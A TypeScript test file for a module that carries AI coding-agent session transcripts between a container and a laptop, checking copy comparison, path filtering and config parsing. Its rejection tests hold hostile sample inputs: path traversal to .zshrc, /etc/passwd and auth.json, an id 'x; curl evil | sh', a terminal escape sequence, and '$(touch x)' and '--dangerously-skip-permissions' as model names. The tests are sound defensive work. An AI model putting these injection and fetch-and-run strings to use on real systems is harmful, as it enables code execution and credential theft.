import { CryptoHasher } from "bun";
import { expect, test } from "bun:test";
import { briefModel, compareCopy, type ContainerFile, groupSessions, linkTarget, parseDefaultAgent, pullable, pullState, tabLabel } from "./handoff.ts";
import { claudeProjectDir } from "./sessions.ts";

test("compareCopy: a container copy the laptop's extends is older; a longer or different one has diverged", () => {
  const bytes = (text: string) => new TextEncoder().encode(text);
  const stat = (text: string) => ({ size: bytes(text).length, sha256: new CryptoHasher("sha256").update(text).digest("hex") });
  const laptop = bytes("turn 1\nturn 2\n");
  expect(compareCopy(laptop, undefined)).toBe("missing");
  expect(compareCopy(laptop, stat("turn 1\nturn 2\n"))).toBe("same");
  expect(compareCopy(laptop, stat("turn 1\n"))).toBe("older");
  expect(compareCopy(laptop, stat("turn 1\nturn 2\nturn 3 on the phone\n"))).toBe("diverged");
  expect(compareCopy(laptop, stat("turn 1\nturn X\n"))).toBe("diverged");
  expect(compareCopy(laptop, stat(""))).toBe("older");
});

test("pullState: a second pull after carrying on here keeps this computer's newer copy", () => {
  const bytes = (text: string) => new TextEncoder().encode(text);
  const stat = (text: string) => ({ size: bytes(text).length, sha256: new CryptoHasher("sha256").update(text).digest("hex") });
  const pulled = "turn 1\nturn 2 on the phone\n";
  expect(pullState(undefined, stat(pulled))).toBe("copy");
  expect(pullState(bytes(pulled), stat(pulled))).toBe("same");
  expect(pullState(bytes(`${pulled}turn 3 here\n`), stat(pulled))).toBe("ahead");
  expect(pullState(bytes("turn 1\n"), stat(pulled))).toBe("copy");
  expect(pullState(bytes("turn 1\nturn 2 here\n"), stat(pulled))).toBe("copy");
});

const REPO = "/Users/me/src/app";
const ID = "0b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b";
const CODEX_A = "0199a213-81c0-7800-8aa1-bbab2a035a53";
const CODEX_B = "0199a213-81c0-7800-8aa1-bbab2a035a54";

function file(agent: "claude" | "codex", path: string, extra: Partial<ContainerFile> = {}): ContainerFile {
  return { agent, file: path, sha256: "x", size: 0, modified: 0, ...extra };
}

function rollout(id: string): string {
  return `sessions/2026/10/17/rollout-2026-10-17T09-30-00-${id}.jsonl`;
}

test("groupSessions gathers each transcript with the files beside it, for this repo only", () => {
  const dir = claudeProjectDir(REPO);
  const sibling = claudeProjectDir(`${REPO}-old`);
  const groups = groupSessions(
    [
      file("claude", `projects/${dir}/${ID}.jsonl`, { id: ID, cwd: REPO }),
      file("claude", `projects/${dir}/${ID}/subagents/agent-1.jsonl`),
      file("claude", `projects/${sibling}/${ID}/subagents/agent-2.jsonl`),
      file("claude", `projects/${sibling}/1b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b.jsonl`, { id: "1b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b", cwd: `${REPO}-old` }),
      file("codex", rollout(CODEX_A), { id: CODEX_A, cwd: `${REPO}/sub` }),
      file("codex", rollout(CODEX_B), { id: CODEX_B, cwd: "/elsewhere" }),
    ],
    REPO,
  );
  expect(groups.map((group) => [group.agent, group.id, group.files.map((one) => one.file)])).toEqual([
    ["claude", ID, [`projects/${dir}/${ID}.jsonl`, `projects/${dir}/${ID}/subagents/agent-1.jsonl`]],
    ["codex", CODEX_A, [rollout(CODEX_A)]],
  ]);
});

test("groupSessions drops entries an agent in the container could forge", () => {
  const dir = claudeProjectDir(REPO);
  const groups = groupSessions(
    [
      file("claude", `projects/${dir}/${ID}.jsonl`, { id: ID, cwd: REPO }),
      file("claude", `projects/${dir}/${ID}/../../../../.zshrc`),
      file("claude", `projects/${dir}/${ID}`),
      file("claude", "/etc/passwd"),
      file("claude", `projects/-Users-me-src-other/${ID}.jsonl`, { id: ID, cwd: REPO }),
      file("claude", `projects/${dir}/1b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b.jsonl`, { id: "1b6f7a4e-3c1d-4e8f-9a2b-1c3d5e7f9a0b", cwd: `${REPO}/\u001b]52;c;eA==\u0007` }),
      file("codex", rollout(CODEX_A), { id: "x; curl evil | sh", cwd: REPO }),
      file("codex", rollout(CODEX_A), { id: CODEX_B, cwd: REPO }),
    ],
    REPO,
  );
  expect(groups.map((group) => [group.agent, group.id, group.files.map((one) => one.file)])).toEqual([
    ["claude", ID, [`projects/${dir}/${ID}.jsonl`]],
  ]);
});

test("pullable accepts only plain paths in the agent's folders for the repo", () => {
  const dir = claudeProjectDir(REPO);
  expect(pullable("claude", `projects/${dir}/${ID}.jsonl`, REPO)).toBe(true);
  expect(pullable("claude", `projects/${dir}-sub/${ID}.jsonl`, REPO)).toBe(true);
  expect(pullable("claude", `projects/${dir}/./${ID}.jsonl`, REPO)).toBe(false);
  expect(pullable("claude", `projects//${ID}.jsonl`, REPO)).toBe(false);
  expect(pullable("claude", "settings.json", REPO)).toBe(false);
  expect(pullable("codex", rollout(CODEX_A), REPO)).toBe(true);
  expect(pullable("codex", `${rollout(CODEX_A)}.zst`, REPO)).toBe(true);
  expect(pullable("codex", "auth.json", REPO)).toBe(false);
  expect(pullable("codex", "sessions/../auth.json", REPO)).toBe(false);
});

test("parseDefaultAgent keeps only the states, agents and pane ids it knows", () => {
  expect(parseDefaultAgent('{"state":"running","configured":"auto","agent":"claude","pane":"w1:p2"}')).toEqual({
    state: "running",
    agent: "claude",
    pane: "w1:p2",
  });
  expect(parseDefaultAgent('{"state":"waiting","configured":"auto","agent":null,"pane":null}')).toEqual({ state: "waiting" });
  expect(parseDefaultAgent('{"state":"running","configured":"cursor","agent":"cursor","pane":"w1:p3"}')).toEqual({
    state: "running",
    agent: "cursor",
    pane: "w1:p3",
  });
  expect(parseDefaultAgent('{"state":"done","agent":"hermes","pane":"w1:p2 --x"}')).toEqual({ state: "off" });
  expect(parseDefaultAgent("null")).toEqual({ state: "off" });
  expect(parseDefaultAgent("")).toEqual({ state: "off" });
});

test("linkTarget opens the running default agent's chat, else the repo's terminal", () => {
  const running = { state: "running", agent: "claude", pane: "w1:p2" } as const;
  expect(linkTarget(running, "w1:p1")).toEqual({ pane: "w1:p2", view: "chat" });
  expect(linkTarget(running, "w1:p1", "terminal")).toEqual({ pane: "w1:p2", view: "terminal" });
  expect(linkTarget({ state: "waiting" }, "w1:p1")).toEqual({ pane: "w1:p1", view: "terminal" });
  expect(linkTarget({ state: "starting", agent: "codex" }, undefined)).toEqual({ pane: undefined, view: "terminal" });
});

test("agent tabs are labelled for people, while the agent keeps its name", () => {
  expect(tabLabel("claude", "claude")).toBe("Claude");
  expect(tabLabel("claude", "claude-2")).toBe("Claude 2");
  expect(tabLabel("codex", "codex-3")).toBe("Codex 3");
  expect(tabLabel("cursor", "cursor")).toBe("Cursor");
});

test("briefModel: reads a Model line near the top, and only a plain model id", () => {
  expect(briefModel("Model: claude-opus-5-5\n\n# Goal\n")).toBe("claude-opus-5-5");
  expect(briefModel("# Handoff\nmodel:   opus  \n")).toBe("opus");
  expect(briefModel("# Goal\nNo model line here\n")).toBeUndefined();
  expect(briefModel("Model: Opus 5.5\n")).toBeUndefined();
  expect(briefModel("Model: $(touch x)\n")).toBeUndefined();
  expect(briefModel("Model: --dangerously-skip-permissions\n")).toBeUndefined();
  expect(briefModel(`${"\n".repeat(25)}Model: claude-opus-5-5\n`)).toBeUndefined();
});
